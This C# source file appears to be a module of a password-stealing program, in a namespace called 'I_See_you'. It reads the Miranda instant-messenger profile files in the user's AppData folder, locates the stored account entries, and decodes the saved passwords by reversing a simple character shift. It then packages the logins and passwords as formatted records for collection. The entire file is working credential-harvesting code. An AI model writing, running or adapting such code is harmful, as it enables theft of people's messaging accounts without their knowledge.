using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace I_See_you
{
    class Miranda
    {
        public static List<PassDataMiranda> Initialise()
        {
            List<PassDataMiranda> list = new List<PassDataMiranda>();
            string text = null;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Miranda\\";
            checked
            {
                string result = "";
                if (Directory.Exists(path))
                {
                    try
                    {
                        string str = Environment.NewLine + Environment.NewLine + "Program: Miranda" +
                                     Environment.NewLine;
                        string[] directories = Directory.GetDirectories(path);
                        string text4 = "";
                        string text5 = "";
                        for (int i = 0; i < directories.Length; i++)
                        {
                            string path2 = directories[i];
                            string[] files = Directory.GetFiles(path2);
                            for (int j = 0; j < files.Length; j++)
                            {
                                string path3 = files[j];
                                string[] array = Strings.Split(File.ReadAllText(path3), " ", -1, CompareMethod.Binary);
                                for (int k = 0; k < array.Length; k++)
                                {
                                    string text2 = array[k];
                                    if (text2.Contains("AM_BaseProto"))
                                    {
                                        text2 = text2.Replace("\u0004", "");
                                        text2 = text2.Replace("\0", "");
                                        string[] array2 = Strings.Split(text2, "�", -1, CompareMethod.Binary);
                                        bool flag = false;
                                        bool flag2 = false;
                                        int arg_E8_0 = 0;
                                        int num = array2.Length - 1;
                                        for (int l = arg_E8_0; l <= num; l++)
                                        {
                                            if (array2[l].Length > 0)
                                            {
                                                if (flag)
                                                {
                                                    str = str + Environment.NewLine + "Password: ";
                                                    string text3 =
                                                        Strings.Split(array2[l], "\n", -1, CompareMethod.Binary)[0];
                                                    int arg_137_0 = 0;
                                                    int num2 = text3.Length - 1;
                                                    for (int m = arg_137_0; m <= num2; m++)
                                                    {
                                                        text4 +=
                                                            Conversions.ToString(
                                                                Strings.ChrW((int) (text3[m] - '\u0005')));
                                                    }
                                                    str = str + Environment.NewLine + Environment.NewLine;
                                                    break;
                                                }
                                                if (flag2)
                                                {
                                                    str = str + Environment.NewLine + array2[l] + Environment.NewLine;
                                                    flag2 = false;
                                                }
                                                if (array2[l].Contains("AM_BaseProto"))
                                                {
                                                    flag2 = true;
                                                }
                                                if (array2[l].Contains("Password"))
                                                {
                                                    text5 = Strings.Left(array2[l], array2[l].Length - 9);
                                                    flag = true;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        list.Add(new PassDataMiranda(text5, text4));
                        return list;
                        
                    }
                    catch (Exception ex)
                    {
                        return list;
                    }
                    return list;
                }
                return list;
            }
        }
    }
    class PassDataMiranda
    {
        public string Login { get; private set; }
        public string Password { get; private set; }
        public PassDataMiranda(string login, string password)
        {
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return
                string.Format(
                    "Program : {0}\r\n\r\nLogin : {1}\r\nPassword : {2}\r\n——————————————————————————————————",
                    new object[]
                    {
                        "Miranda",
                        Login,
                        Password,
                    });
        }
    }
}
